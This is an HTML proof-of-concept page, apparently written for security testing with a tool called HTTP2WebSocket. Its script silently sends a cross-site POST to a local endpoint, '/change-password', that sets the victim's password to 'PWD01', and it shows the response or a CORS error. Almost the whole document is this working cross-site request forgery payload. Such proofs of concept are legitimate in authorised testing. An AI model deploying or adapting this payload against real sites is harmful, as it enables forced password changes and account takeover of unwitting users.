<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>CSRF Web socket POC for HTTP2WebSocket</title>
</head>

<body>

 <script language="javascript" type="text/javascript">

  	//URL points to the local listener WS endpoint
  	var wsUri = "http://127.0.0.1:3333/change-password"; 
  
	var xhr = new XMLHttpRequest();
	xhr.open("POST", wsUri, true);
	xhr.setRequestHeader("Content-Type", "application/json");
	xhr.onreadystatechange = function () {
	    output = document.getElementById("output");
	    if (xhr.readyState === 4 && xhr.status === 200) {
		var json = JSON.parse(xhr.responseText);
		
		output.innerHTML = json;
	    }
	    else {
	    	output.innerHTML = "Cannot read the response, probably the error is due to CORS browser implementation. Check the HTTP2WebSocket.py console message";
	    }
	};
	var data = JSON.stringify({"npass": "PWD01", "cpass": "PWD01"});
	xhr.send(data);

  </script>


  <h2>CSRF Websocket POC for HTTP2WebSocket</h2>

  <div id="output"></div>
  
  </body>
  </html>
